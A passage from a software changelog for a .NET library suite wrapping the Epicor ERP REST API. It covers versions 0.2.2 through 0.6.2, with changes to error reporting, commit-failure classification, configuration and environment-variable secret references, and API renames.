- **Three more `FailureStageTests` cases** covering `MarkIndeterminate`, including that it overrides an earlier `Uncommitted` mark — the worse label must win.

### Notes

Three methods needed judgment rather than the mechanical pattern:

- **`MoveInventoryAsync`** has three documented *business* outcomes that ride on `Success` — `MSG`, `MissingSerialNumbers`, and `pcNeqQtyAction == "stop"`. Those are Epicor declining a well-understood request, not failures, and they carry no stage. Its `PreCommitTransfer` failure is `Uncommitted`: pre-commit is still preparation and no stock has moved.

- **`AddMtlsAsync`** has two write points, not one. `GenerateGroup` creates an ECO group and is a commit in its own right, so a failure there is classified rather than assumed uncommitted. A later failure before `Update` is `Uncommitted` — no materials were written — even though a group may exist from the earlier step. Retrying is safe: the flow adopts an existing group rather than creating a second.

- **`CreateQuoteAsync` and `CreateProjectAsync`** can fail *after* a successful commit, when the saved dataset is missing the field the result is built from. Those are `Indeterminate`, not `Uncommitted`.

### Version

- `EpicorSvcs` 0.6.1 → 0.6.2. `RESTServices` (0.3.1), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.6.1 — 2026-08-25

Adds the commit-boundary vocabulary: a failure now says which side of the write it landed on, so a caller can tell a retry that is safe from one that needs a look first. Additive — nothing existing changes behavior. `CreateOrderAsync` is the reference implementation; the other orchestrators follow in a later change.

### Added

- **`FailureStage` and `OperationResult<T>.FailureStage`.** Every orchestrator has exactly one commit boundary — the single call that writes to Epicor (`MasterUpdate` for orders, `CommitTransferAndUpdateHistory` for inventory). Which side of it a failure landed on is the most useful fact a caller can have and is not recoverable from the error message. `Uncommitted` means nothing was written and the call can be retried as-is. `Indeterminate` means a commit was attempted and its outcome is unknown, so the caller must establish whether the record exists first. The property is null on success, and null on any method with no commit boundary — reads and single BO wrappers classify nothing.

- **`EpicorSvc.MarkUncommitted<T>()` and `EpicorSvc.ClassifyCommit<T>()`.** `protected internal static` helpers shared by every service. `MarkUncommitted` labels a failure returned from before the commit call. `ClassifyCommit` labels the commit's own result: an Epicor HTTP status in the 4xx range means the server received the request, processed it, and declined it — nothing was written, so `Uncommitted`. Anything else (no status at all, as with a timeout or dropped connection; or a 5xx) is `Indeterminate`, because it may have happened after Epicor committed. The classification is deliberately pessimistic: an unnecessary reconciliation costs a query, a wrong "safe to retry" costs a duplicate record.

- **`SalesOrderSvc.CreateOrderAsync` classifies its failures.** Failures from `GetNewOrderHed`, the `Change*` steps, and the dataset guards are marked `Uncommitted`; the `MasterUpdate` result is passed through `ClassifyCommit`. Its `<remarks>` now state plainly that the method is not idempotent, and show the caller-side branch.

- **`FailureStageTests`.** Offline coverage for both helpers across the 4xx range, 5xx, a status-less timeout, an unexpected status, success, and null.

### Notes

A timeout cannot be classified any further, by anyone. `HttpClient` reports it without saying whether the request was sent, so the information does not exist on this side of the connection. That is the case that produces duplicate records, and it is why `FailureStage` is a label rather than a guarantee.

**Keri does not deduplicate and will not.** It has no store of its own and requires no schema of yours — no UD table, no custom `_c` column, nothing an Epicor admin has to add before the library works. `Indeterminate` tells a caller to check; how they check is their application's decision.

### Version

- `EpicorSvcs` 0.6.0 → 0.6.1. `RESTServices` (0.3.1), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.6.0 — 2026-08-24

Closes the pattern 0.4.2 and 0.5.0 started on: four remaining places where a method asserted an outcome it never established. An audit of all seventeen direct `OperationResult<T>.Success(...)` call sites in the library found these four; the other thirteen are correct — each follows an `IsFailure` check or shapes a value that was already evaluated upstream. **Minor rather than patch:** `TruncateAsync` and `AddMtlsAsync` both change documented runtime behavior.

### Changed

- **`UDXSvc.TruncateAsync` verifies its deletes.** *Breaking.* The loop discarded every `DeleteByIDAsync` result and incremented its counter unconditionally, so a run in which every delete failed still returned `Success` with a count equal to the table's row count — on a destructive operation gated behind an explicit `confirmTruncate: true`, in the one place a caller most needs a true answer. Each delete is now checked; the first failure stops the loop and returns a failure naming how many rows were removed before it. A caller that previously read the count as "rows deleted" was, in the failure case, reading "rows found".

- **`EngWorkBenchSvc.AddMtlsAsync` reports failures as failures.** *Breaking.* A material row that could not be populated set a local `bool isError` and the method then returned `OperationResult<JObject>.Success(ds)` — an explicitly-known error, returned as a success carrying a half-built dataset. It now returns a `Failure` carrying the reason: Epicor's message when `GetNewECOMtl` refused the row, or the captured exception when the dataset did not have the expected `ECOMtl` shape. The group is still unlocked in both cases, and the dataset as it stood is attached to `RawResponse`.

### Fixed

- **`AddMtlsAsync` no longer swallows exceptions.** The row-population block was wrapped in a bare `catch { isError = true; }`, discarding the exception entirely — the result carried no message at all. It now captures the exception into the failure result. It also stops on the first such error rather than continuing to populate rows it will discard, matching the `GetNewECOMtl` failure branch directly above it.

- **`AddMtlsAsync` validates its input.** An empty or null `mtls` list reached `mtls.First()` and threw `InvalidOperationException` / `NullReferenceException` from inside the method. It now throws `ArgumentException` naming the parameter, matching `TruncateAsync`'s argument handling.

- **Three more unguarded dataset reads.** `QuoteSvc.CreateQuoteAsync` stamped six fields onto `ds["ds"]["QuoteHed"][0]` and read `QuoteNum` off the saved dataset; `ProjectSvc.CreateProjectAsync` stamped `Description` onto `ds["ds"]["Project"][0]` and could return a null `Project` inside a success when `ExtractDto` found no row. Each now returns a failure carrying Epicor's message via `EpicorSvc.StepFailure<T>()`, the same treatment the order and inventory orchestrators received in 0.4.2 and 0.5.0.

### Documentation

- **`TruncateAsync` remarks** now state that the row query is capped at 5000 rows — a larger table is not fully cleared by one call, and the returned count is rows deleted, not the table's remaining size. The `<returns>` text describes the new stop-on-first-failure behavior.

### Version

- `EpicorSvcs` 0.5.0 → 0.6.0. `RESTServices` (0.3.1), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.5.0 — 2026-08-24

`MoveInventoryAsync` now reports failures as failures. Its terminal commit is evaluated instead of being wrapped in an unconditional `Success`, an Epicor error partway through is no longer returned as a success carrying an error, and every read of an in-flight dataset is shape-checked. **Minor rather than patch: this changes documented runtime behavior** — calls that previously returned `IsSuccess: true` with an error in the payload now return `IsSuccess: false`. That is the point of the change, but a caller relying on the old shape will see different results.

### Changed

- **`MoveInventoryAsync` evaluates its commit.** The method ended with `OperationResult<JObject>.Success(ds)` regardless of what `PreCommitTransfer` and `CommitTransferAndUpdateHistory` returned — a failed commit reported as a success. The commit result now routes through `ToOperationResult`, and pre-commit is checked before the commit runs so a rejected dataset is never committed. This is the framework's one structural blind spot: the implicit "malformed shape halts the next call" protection needs a *next* call, and the terminal commit has none.

- **An Epicor error after the bin/quantity steps is now a `Failure`.** The existing `ds["ErrorMessage"] != null` guard returned `Success(ds)`, putting an error inside a success. It now returns a failure carrying that message. The three documented *business* outcomes — `MSG`, `MissingSerialNumbers`, and `pcNeqQtyAction == "stop"` — are unchanged and still ride on `Success`, because those are Epicor declining a well-understood request rather than failing.

### Fixed

- **Five unguarded dataset reads in the inventory orchestrators.** `MoveInventoryAsync` read `TrackSerialnumbers` off `ds.InvTrans[0]`, `MissingSerialNumbers` and `ds1.SelectedSerialNumbers` off the serial-tracking result, and `pcNeqQtyAction` off the bin-test result; `TrackSerialNumberAsync` read `whereClause`, `sourceRowID`, and `transType` off `ds.SelectSerialNumbersParams[0]`. Each throws `NullReferenceException` (or `ArgumentNullException`, via `JArray.FromObject`) when the preceding step returns an error shape — discarding the Epicor message that explains why. All are now checked and return a failure carrying that message.

### Added

- **`EpicorSvc.StepFailure<T>()`.** A `protected static` helper shared by every service: builds the failure result for a process step that returned an unusable shape, preferring Epicor's own `ErrorMessage` and falling back to naming the step and the expected shape, with the response attached as `RawResponse` and the transport `statusCode` carried through. Replaces the private copy added to `SalesOrderSvc.Workflows.cs` in 0.4.2, which is removed — two call sites was the right moment to lift it rather than let a third copy appear.

### Documentation

- **`MoveInventoryAsync` remarks** now separate business outcomes from failures, explain why the terminal commit is checked explicitly, and state plainly that the method is **not idempotent** — each call that reaches the commit moves stock again.

### Version

- `EpicorSvcs` 0.4.2 → 0.5.0. `RESTServices` (0.3.1), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## EpicorSvcs 0.4.2 — 2026-08-24

A patch release hardening the `SalesOrderSvc` orchestrators against Epicor error responses. Both order orchestrators read fields out of an in-flight dataset that a *failed* process step does not return. Those reads are now guarded, and a step that returns an error shape produces a `Failure` carrying Epicor's own message instead of an exception thrown from a missing node. `EpicorSvcs` only; no other project changed.

### Fixed

- **`AddOrderLineAsync` no longer throws `NullReferenceException` when a part is rejected.** `ChangePartNumMaster` returns an error-shaped object — no `ds.OrderDtl` row — when the part is invalid, not saleable to the customer, or prompts on a revision change. The method then read `ds["ds"]["OrderDtl"][0]["CustNum"]` unguarded, so the first line-validation failure surfaced as a null dereference and Epicor's `ErrorMessage`, sitting in that same object, was lost. The row and both fields read off it are now checked, and the failure is returned as a value with the message and the raw response attached.

- **`AddOrderLineAsync` no longer throws `ArgumentNullException` when the quantity step fails.** `ChangeSellingQtyMaster` returns a `parameters` envelope on success and none on failure; `JObject.FromObject(ds["parameters"])` threw on the null token. The envelope is now checked before it is unwrapped.

- **`CreateOrderAsync` guards the same pattern.** An unknown `CustID`, or a customer with no valid sold-to contact, leaves no `ds.OrderHed` row to stamp `PONum`, `RequestDate`, and `NeedByDate` onto. The row and its `CustNum` are now checked before use.

### Version

- `EpicorSvcs` 0.4.1 → 0.4.2. `RESTServices` (0.3.1), `FileHandling` (0.3.0), and `KeriConfigurator` (0.5.0) are unchanged.

## KeriConfigurator 0.5.0 — 2026-06-09

Adds environment-variable references to configuration: any `App.config` value may be written as `{ENV:NAME}` and is resolved from the process environment, so secrets can stay off disk on a live/deployed machine while `App.config` remains the single, self-documenting source of configuration *shape*. Additive and backward-compatible — existing literal values behave exactly as before. `KeriConfigurator` only; `RESTServices` / `EpicorSvcs` / `FileHandling` are unchanged.

### Added

- **`{ENV:NAME}` environment-variable references.** `KeriConfig` resolves any configured value written as `{ENV:NAME}` from the environment variable `NAME` at build time. A literal value is used as-is, and the environment is read *only* where a value is a token — there is no global mode flag and no precedence rule; the presence of the token is the only switch, and each `App.config` node states where its value comes from. Applies to every setting (connection and SMTP), not just secrets.

- **Value-or-environment-reference prompts in the console.** For the three secrets — the Epicor password, the API key, and the SMTP password — KeriConfigurator now offers `[V]` (enter a masked literal, stored in `App.config`) or `[E]` (reference an environment variable, suggesting `EPICOR_PASSWORD` / `EPICOR_API_KEY` / `SMTP_PASSWORD`), writing the `{ENV:NAME}` token rather than the secret. The variable name is sanity-checked. The configuration summary now reports each field's source — its literal, or `(from env NAME)` — and flags a referenced variable that isn't set in the current session.

### Changed

- **Configuration resolution is environment-aware.** `KeriConfig.BuildSession()` and `BuildSmtpSettings()` route every value through a single resolver that handles `{ENV:NAME}` tokens (and still collapses blank / `YOUR_*` placeholders to empty). The console's live connection test and SMTP reachability test resolve the same way, so a `[V]` value tests directly and an `[E]` reference tests against the real variable when it is set in the session; when it isn't, the console offers to save the reference without testing (it resolves at runtime where the variable exists). The former `ResolveApiKey()` is folded into the shared resolver.

- **Validation names an unset referenced variable.** When a *required* setting resolves empty because its `{ENV:NAME}` reference isn't set, the error names the variable (e.g. *DefaultPasskey references environment variable EPICOR_PASSWORD, which is not set*) rather than reporting a generic missing value. An *optional* setting whose reference is unset simply resolves to empty — for the API key, that means Basic/v1 auth, exactly as a blank literal would.

### Documentation

- **CONFIGURATION.md** gains an *Environment-variable references (`{ENV:NAME}`)* section (sandbox-vs-live, the token-is-the-only-switch model, the console flow, test behavior, validation); the secrets-prompt and hand-editing notes now mention the `[V]/[E]` choice and token syntax; and the stale "`EPICOR_*` removed / future option" note is corrected to describe the explicit-reference model. **README.md** gains a short *Environment-variable references* subsection and the migration line is fixed. **App.config.template** demonstrates the `{ENV:NAME}` form on each secret node.

### Version

- `KeriConfigurator` 0.4.0 → 0.5.0. No other project changed.

## [0.4.1] — 2026-06-08

A patch release bundling everything since 0.4.0. The headline change: entity-set reads now derive their OData `$select` from the row DTO instead of hand-maintained column lists — fixing rows whose typed properties came back null — with a new `additionalColumns` channel for columns the DTO doesn't model. It also folds in the dataset-factory and auth-route renames, a BAQ method rename, repo/demo hygiene, and the supporting docs. Every change is in-solution; nothing outside the solution can break. `EpicorSvcs` — 0.4.1 (driver).

### Added

- **`EpicorSvc.SelectFor<T>()`.** Reflects a DTO's public properties into the OData `$select` column list — skipping the `[JsonExtensionData]` overflow and `[JsonIgnore]` members, honoring `[JsonProperty]` names, cached per type. Because the request mirrors the DTO, every typed property on a returned row is populated.

- **`additionalColumns` on every entity-set read.** A `List<string>` parameter that appends columns the DTO doesn't model — install-specific `_c` columns or Epicor UD placeholder columns (`ShortChar01`, `Character01`, …) — to the `$select`. They come back in the row's `ExtraData` overflow. Like the other OData options, it is honored only on v2 OData (API-key) sessions.

- **Offline `SelectFor` tests.** `SelectForTests` pins the reflection rules against a controlled DTO (rename / ignore / extension-data / indexer handling) and smoke-tests the real `POHeader`. No live Epicor session required.

### Changed

- **Entity-set reads default `$select` to the DTO.** *In-solution.* All twelve entity-set services — `POSvc`, `ReceiptSvc`, `PartSvc`, `CustomerSvc`, `VendorSvc`, `SerialNoSvc`, `PayMethodSvc`, `PaymentEntrySvc`, `MiscShipSvc`, `SalesOrderSvc`, `QuoteSvc`, and `JobEntrySvc` (20 read methods in all) — now build their default `$select` from `SelectFor<T>()` and accept `additionalColumns`. The 20 hand-maintained `default*Select` lists are deleted. This fixes a latent bug: a default list shorter than its DTO left the un-selected typed properties null on every returned row even though the data existed. The existing `select` parameter is unchanged — a full override that also serves as a lean-projection lever. `EpicorSvcs` — 0.4.1.

- **`NewDS` field → `NewDataset()` method.** *In-solution.* The shared mutable `JObject NewDS` field on `EpicorSvc` became a `NewDataset()` factory returning a fresh `{"ds":{}}` envelope per call, so two flows in flight never alias one object. The old "copy it before you mutate it" pattern is no longer needed.

- **`BAQSvc.BAQResultsAsync` → `ExecuteAsync`.** *In-solution.* The BAQ execution method was renamed to read as the action it performs; in-solution call sites were updated.

- **`DynamicURLModifier_OAuth` → `DynamicURLModifier_Keyed`.** *(RESTServices) In-solution.* The auth-object URL-modifier field was renamed to describe the API-key route generically, paired with `_Basic`.

### Removed

- **Unused demo `app.manifest`** and its `.csproj` reference.
- **Stray duplicate `EpicorSvcPOCs.csproj`** at the repository root (the real one lives in the project folder).

### Documentation

- **The read model is documented across the docs.** `README`, `CONTRIBUTING`, `EXAMPLES_EPICOR`, and `CONFIGURATION` now explain the DTO-drives-`$select` model, `additionalColumns`, the `ExtraData` overflow, and the `NewDataset()` lifecycle — and each calls out the **v2-only** limitation: OData query options (`select` / `additionalColumns` / `top` / `filters`) are silently ignored on a Basic/v1 session, which returns the full collection. The stale `NewDS` section in `EXAMPLES_EPICOR` was corrected (field → method).

- **Earlier docs in this cycle:** documented the `ds` dataset-envelope lifecycle and split use-vs-extend guidance across `README`/`CONTRIBUTING`, and stated the pragmatic pre-1.0 versioning policy.

- **`CLEANUP_RECOMMENDATIONS.md`:** marked error feedback as shipped (0.4.0); parked pagination (`$skip` + end-of-data detection) and a warn-on-v1 idea for OData options on Basic sessions.

- **Demo:** the bundled `Parts_BAQ` now uses `OnHoldDate`, and a real company code in the sample data was replaced with the `EPIC01` placeholder.

### Version bumps

- `EpicorSvcs` 0.4.0 → 0.4.1 (driver). `RESTServices` 0.3.0 → 0.3.1 (the `_Keyed` rename). `KeriConfigurator` (0.4.0) and `FileHandling` (0.3.0) are unchanged.

## [0.4.0] — 2026-06-06

This release surfaces Epicor's error feedback as first-class data, collapses the REST transport into a single class, and renames the client factory to state its purpose. *Breaking* for `EpicorSvcs` (the content of `OperationResult.ErrorMessage` changes) and `KeriConfigurator` (the factory rename); `RESTServices` syncs to 0.3.0 (transport collapse plus new error fields); `FileHandling` is unchanged at 0.3.0.

### Added

- **`OperationResult<T>.ErrorType` and `OperationResult<T>.CorrelationId`.** First-class error fields. `ErrorType` is Epicor's fully-qualified exception class (e.g. `Ice.Common.RecordNotFoundException`); `CorrelationId` is Epicor's per-call id, which matches a failure to a server-side log entry. Both are populated by parsing Epicor's error envelope, and both are null on success or for non-Epicor errors. Branch on `ErrorType` rather than scraping `ErrorMessage` text.

- **Structured error fields on the transport response.** *(RESTServices)* On an HTTP error, `RESTConnect` now returns `statusCode` (numeric), `reasonPhrase`, and `httpResponseBody` (the raw body, verbatim) as properties alongside `ErrorMessage`. The transport stays vendor-neutral — it carries the body, it does not parse it.

- **Demo and POCs print `CorrelationId` on failure.** Every failure path in `EpicorSvcDemo` and the `EpicorSvcPOCs` prints the correlation id beneath the error message (when one is present), so a failed run shows the id to match against Epicor's logs.

### Changed

- **Epicor error feedback is parsed and surfaced.** *Breaking.* `OperationResult.ErrorMessage` now carries Epicor's clean message (e.g. `Record not found.`) instead of the raw `HTTP {status} {reason} calling {uri} — {body}` string the transport previously produced. The work is layered: `RESTServices` emits the numeric status and raw body (vendor-neutral); `EpicorSvcs` parses Epicor's flat error envelope (`ErrorMessage` / `ErrorType` / `CorrelationId` / `HttpStatus`) from that body and stores the parsed envelope (with `ErrorDetails`) in `RawResponse`. A consumer that logged or matched on the old message string will see different text. `EpicorSvcs` — 0.4.0.

- **`RESTHttpClient` collapsed into `RESTConnect`.** *(RESTServices) Breaking.* The `RESTConnect` / `RESTHttpClient` inheritance pair merged into a single `public class RESTConnect` in `RESTServices.Transport` — an internal seam with nothing on the other side of it. `EpicorSvc` still derives from `RESTConnect` (unchanged); the internal static helpers (`BuildResourceUrl`, `ResolveApiKeyHeaderName`) remain internal and are still reached by the test project via `InternalsVisibleTo`. `RESTServices` — 0.3.0.

- **`KeriConfig.CreateClient()` renamed to `KeriConfig.BuildEpicorClient()`.** *Breaking (in-solution).* The factory now names what it returns — your connection to the Epicor/Kinetic REST API — and joins the `BuildSession()` / `BuildSmtpSettings()` family. In-solution callers (the demo and POCs) were updated. `KeriConfigurator` — 0.4.0.

- **`UDTableSvc.IsRecordNotFound` keys on `ErrorType`.** Not-found detection now matches `ErrorType == "Ice.Common.RecordNotFoundException"` (with a bare-404 fallback), replacing the previous status-code-or-message-text sniff. The Automatic upsert's add-vs-update fall-through is unchanged in behavior, more robust in mechanism.

- **Version bumps.** `EpicorSvcs` 0.3.0 — 0.4.0 (driver; breaking error-message content). `RESTServices` 0.2.5 — 0.3.0 (transport collapse, breaking; plus the additive error fields). `KeriConfigurator` 0.3.0 — 0.4.0 (breaking factory rename). `FileHandling` is unchanged at 0.3.0.

### Fixed

- **`OperationResult.StatusCode` was always null.** The transport baked the HTTP status into the `ErrorMessage` string only and never exposed it as a value, so `StatusCode` never populated. It now reads the numeric status the transport emits (falling back to the envelope's `HttpStatus`), so status-code checks work.

### Removed

- **`RESTHttpClient` (public type).** *(RESTServices) Breaking.* Merged into `RESTConnect`; see Changed. No external reference to the type survives in the solution.

---

## [0.3.0] — 2026-06-06

Configuration moves out of the libraries into a dedicated composition root. `EpicorSvcs` and `FileHandling` no longer read configuration at all; the new `KeriConfigurator` project owns the unified settings, builds the sessions/clients and email settings, and onboards them interactively with live tests. *Breaking* for both libraries — they sync to 0.3.0; `RESTServices` is unchanged at 0.2.5.

### Added

- **`KeriConfigurator` — composition root and interactive setup console.** A `net48;net8.0` project that owns the single unified settings schema (Epicor connection *and* email/SMTP), the one shared `App.config` the executables consume via `<AppConfig>`, and the readers/factories that turn settings into objects: `KeriConfig.BuildEpicorClient()` (an `EpicorClient`) and `KeriConfig.BuildSmtpSettings()` (an `SmtpSettings`). The console onboards a fresh checkout end to end — it revisits any blank or placeholder field on each run (Enter keeps the current value; secrets are masked), tests the Epicor connection against the live server before saving, prompts for email, and runs an SMTP reachability test with a Keep/Re-enter/Skip choice on failure. It seeds its `App.config` from `App.config.template` on first build, then it (or a hand edit) fills in the values.

- **`EpicorClient.TestConnectionAsync(CancellationToken)` — connectivity probe.** Reads a single Part record and returns `OperationResult<bool>`; used by the configurator (and available to callers) to verify a session reaches the server.

- **`Emailer.TestConnection(SmtpSettings)` — SMTP reachability probe.** Opens a TCP connection to the relay and reads its greeting, with a timeout; returns `null` on success or an error string. It does not authenticate, negotiate TLS, or send a message — it verifies host/port/firewall, not credentials. A single code path on both target frameworks (no MailKit, no `#if`).

### Changed

- **The libraries are configuration-free; configuration is owned by the composition root.** *Breaking.* `EpicorSvcs` and `FileHandling` no longer read `App.config` (or anything else) as a side effect of construction. Configuration is resolved once, in `KeriConfigurator`, and flows inward as plain objects — an `EpicorRESTSessionKey` to `EpicorClient`, an `SmtpSettings` to the email path. In-solution callers use `KeriConfig.BuildEpicorClient()`; external callers build an `EpicorRESTSessionKey` and use `new EpicorClient(session)`.

- **`SmtpSettings` is public and config-free; `FileProcessing.EmailReport` / `IsEmailConfigured` take it.** *Breaking (source).* `EmailReport(EMailMeta)` → `EmailReport(EMailMeta, SmtpSettings)` and `IsEmailConfigured()` → `IsEmailConfigured(SmtpSettings)`; the caller now supplies the email configuration. `SmtpSettings` (formerly `internal`) became `public`, gained a `developerEmail` field, and its `acct` field — the `From:` address — was renamed `from`. `Emailer.Send` is unchanged. FileHandling syncs to 0.3.0.

- **Version syncs.** `EpicorSvcs` → 0.3.0 and `FileHandling` → 0.3.0 (both breaking this cycle); `RESTServices` stays at 0.2.5 (unchanged); `KeriConfigurator` takes 0.3.0 as its initial version, aligned with the coordinated release.

### Removed

- **`EpicorClient.FromConfiguration()` and the `EpicorConfiguration` class.** *Breaking.* Config-based client construction moves to the composition root. Replace `EpicorClient.FromConfiguration()` with `KeriConfig.BuildEpicorClient()` (in-solution) or `new EpicorClient(session)` (external).

- **`SmtpSettings.FromConfiguration()` and the per-library `Settings` schemas** (`EpicorSvcs` and `FileHandling`), along with their net8 `System.Configuration.ConfigurationManager` package references and the per-project `App.config` seeding. The single remaining `Settings` schema and seed target live in `KeriConfigurator`.

- **Environment-variable configuration (`EPICOR_*`).** *Breaking.* Removed with `EpicorConfiguration`. v0.3.0 reads `App.config` by default; to keep secrets off disk, build an `EpicorRESTSessionKey` in code (web portal, vault, Windows Credential Manager). Re-introducing an environment-variable reader at the composition root is a documented future option — see CONFIGURATION.md.

---

## [0.2.6] — 2026-06-05

### Added

- **`UDTableSvc.SaveAsync(UDRow, RowMod mode = Automatic, …)`** — a convenience over the raw `UpdateAsync(ds)` primitive. It fetches a correctly-shaped dataset (`GetaNew` for an add, `GetByID` for an update — never hand-built), merges the row's populated columns onto it, sets `RowMod`, and commits via `Update`. `mode` selects the operation: `Add`, `Update`, `Delete`, or `Automatic` (the default), which updates the row when it already exists and adds it otherwise. `Delete` is routed through `DeleteByID` (a `"D"` through `Update` does not take on UD tables). The typed `SaveAsync<T>` gained the same `mode` parameter (optional, so existing calls are unaffected).

- **`RowMod` enum** (`EpicorSvcs.Dtos.RowMod`) — `Automatic` / `Add` / `Update` / `Delete`, mapping to Epicor's wire `RowMod` values, as the operation selector for `SaveAsync`. Distinct from the per-row `RowMod` string the raw dataset primitive reads.

### Changed

- **Config setting `EpicorBaseUrl` renamed to `DefaultBaseUrl`** to match the `Default*` naming of its siblings (`DefaultUser`, `DefaultPasskey`, `DefaultCompany`) in the `EpicorSvcs.Properties.Settings` node — the node name already scopes it to Epicor, so the `Epicor` prefix on the setting was redundant. The `EPICOR_BASE_URL` environment-variable override is unchanged. *Breaking (config):* rename `EpicorBaseUrl` to `DefaultBaseUrl` in any `App.config`.

- **Service constructor parameter `env` renamed to `session`.** The base `EpicorSvc` constructor and all 23 service constructors took an `EpicorRESTSessionKey` still named `env` — a leftover from the removed environment selector. Renamed to `session` to match the parameter's type and the `EpicorClient` session constructor. *Source-breaking only* for the unlikely named-argument caller (`new PartSvc(env: …)`); positional calls are unaffected.

- **`UDTableSvc.UpdateAsync` is now a pure dataset primitive.** It previously took a `UDRow`, fetched a `GetaNew` template, merged, and committed as a hard-coded insert (`RowMod "A"`). It now takes a `JObject ds` and posts it to `Ice.BO.{table}Svc/Update` verbatim — mirroring every other service's `UpdateAsync(ds)` — so the caller owns each row's `RowMod` and one dataset can carry a mix of add/update/delete rows. *Breaking (source):* `UDTable.UpdateAsync(udRow)` no longer compiles; call `SaveAsync(udRow, …)` instead.

- **`UDTableSvc` source split into partials** — native Epicor endpoints and shared resolvers stay in `UDTableSvc.cs`; composed operations (`SaveAsync`, `TruncateAsync`) move to `UDTableSvc.Workflows.cs`; the `Character10` legend helpers move to `UDTableSvc.ColumnLegend.cs`. Follows the existing `.Workflows.cs` convention. No API or behavior change — purely organizational.

### Fixed

- **`DefaultApiKey` config setting is now honored.** It was referenced in the validation message, CONFIGURATION.md, and README, but never existed in `Settings` and `BuildSession` hard-coded the API-key fallback to an empty string — so an API key could only be supplied via the `EPICOR_APIKEY` environment variable, never `App.config`. The `DefaultApiKey` user setting now exists (placeholder `YOUR_EPICOR_APIKEY`), and the API key resolves env-var-first then `DefaultApiKey`, mirroring every other `Default*` setting. An unset or still-placeholder value resolves to empty so Basic-auth (v1) deployments are unaffected; a real key switches the transport to API-key auth (v2 OData), which is what determines the auth mode.

---

## [0.2.5] — 2026-06-05

### Changed

- **Collapsed to a single configured environment; `RESTSessionKey.Environment` renamed to `BaseUrl`.** The three-environment selector is gone. `Environment` — a selector that resolved a literal URL out of a Live/Pilot/Development set — is now `BaseUrl`, a plain literal base URL with no selector logic. Configuration holds one URL (`EpicorBaseUrl`, env override `EPICOR_BASE_URL`) in place of `DefaultEnvironment` + `EnvLive`/`EnvPilot`/`EnvTest` (and the `EPICOR_ENV*` overrides). To target more than one environment, build a full `EpicorRESTSessionKey` per environment in code — a base URL on its own can't carry the credentials and company a real environment switch needs. `RESTServices` changed this cycle and synced to 0.2.5.

  *Breaking:* `RESTSessionKey.Environment` (and `EpicorRESTSessionKey.Environment`) → `BaseUrl`. The config schema changes — replace `DefaultEnvironment`/`EnvLive`/`EnvPilot`/`EnvTest` in `App.config` with a single `EpicorBaseUrl`.

### Removed

- **`RESTEnvironments` class** — it existed only to hold the three selector URLs the `Environment` setter chose between.

- **The environment parameter on the config factories.** `EpicorClient.FromConfiguration()` and `EpicorConfiguration.BuildSession()` no longer take an `env` argument; they read the single configured URL. *Breaking (source):* `FromConfiguration("pilot")` / `BuildSession(env)` no longer compile — call with no argument, or pass a full `EpicorRESTSessionKey` to the `EpicorClient` constructor to reach a different server.

---

## [0.2.4] — 2026-06-05

### Changed

- **Services are session-only (config-agnostic boundary complete).** The `EpicorSvc(string env)` constructor and the matching `(string env)` constructor on all 23 service classes are removed; services are now constructed only from an `EpicorRESTSessionKey`. Configuration is read in exactly one place — `EpicorConfiguration.BuildSession()` / `EpicorClient.FromConfiguration()` — so constructing a service no longer reaches into config as a side effect. This completes the config-agnostic boundary begun in 0.2.3 (the client and email halves).

  *Breaking (source):* `new PartSvc()` / `new PartSvc("pilot")` — and the same on every service — no longer compile. Obtain a session via `EpicorConfiguration.BuildSession(env)` and pass it in, or build the client with `EpicorClient.FromConfiguration(env)` and use the facade. No runtime behavior change; the session-only path already existed and is now the only way in. Pre-1.0, no migration shim.

### Fixed

- **UD-table writes now use Epicor's GetaNew → merge → Update idiom.** `UDTableSvc.UpdateAsync` previously hand-built a row and POSTed it to the OData entity set with every column coerced to a string, which Epicor's typed entity binder rejected with "Unable to deserialize entity." It now fetches a fresh template row from `GetaNew{table}`, merges the caller's populated columns onto it preserving native JSON types (numbers, booleans, dates), skips unset/min-value dates so they don't overwrite server defaults, and commits the dataset via `Ice.BO.{table}Svc/Update` with `RowMod "A"` (insert semantics). Reads, the five-string `GetByID`/`DeleteByID`, and the delete branch are unchanged. Proven end-to-end against a live instance.

---

## [0.2.3] — 2026-06-04

### Changed

- **Configuration loading is now explicit.** Reading `App.config` / environment variables moved out of the `EpicorClient` constructor into a named factory: use `EpicorClient.FromConfiguration(env)` (or `EpicorConfiguration.BuildSession(env)` directly) instead of `new EpicorClient()`. The new `EpicorConfiguration` class is the single place the library reads configuration; `EpicorClient` is otherwise built from a session. Behavior is unchanged — same settings, same env-var-first/App.config-second resolution, same environment selector, same validation message.

  *Breaking (source):* the parameterless `new EpicorClient()` / `new EpicorClient(env)` constructor is removed; callers move to `EpicorClient.FromConfiguration()`. No runtime behavior change. No migration shim provided (pre-1.0, no external consumers). Direct service construction (`new PartSvc(env)`) is unaffected.

- **FileHandling configuration loading is now explicit (config-agnostic email).** SMTP settings and the default developer-recipient address are no longer read from `App.config` as a side effect of constructing `EmailSpecs` / `SmtpSettings`. `SmtpSettings` now carries neutral defaults; the new `SmtpSettings.FromConfiguration()` reads SMTP settings from configuration, and `FileProcessing.EmailReport` calls it (and loads the developer email) explicitly — making `EmailReport` the single place the email path reads configuration. This is the FileHandling half of the same config-agnostic boundary as the `EpicorClient.FromConfiguration` change above. Behavior is unchanged for callers, since `EmailReport` is the public entry point and resolves the same settings it always did. FileHandling synced to 0.2.3.

  *Breaking (source, internal only):* `SmtpSettings` is `internal`, so no public signatures change. A plain `new EmailSpecs()` now carries neutral SMTP defaults rather than config-sourced ones — this affects only code calling `Emailer.Send(new EmailSpecs())` directly instead of via `EmailReport`, and a codebase check found no such callers (`smtpspecs` being `internal` made that path unconfigurable from outside the assembly regardless).

---

## [0.2.2] — 2026-06-03

### Changed

- **`UDTableSvc.UDTableDefault` no longer defaults to `"UD22"`.** It now starts unset (null). Constructive calls (reads and upserts) that neither pass a `UDTable` argument nor have `UDTableDefault` set now throw the existing "pass a UDTable argument or set UDTableDefault" error instead of silently targeting `UD22`. The library has no way to know which UD tables a given install uses, so guessing one was the same "invent a value the caller didn't declare" problem the key-default change addressed — callers that want a fallback set `UDTableDefault` explicitly (one line), exactly as the write example in `EXAMPLES_EPICOR.md` already shows.

### Documentation

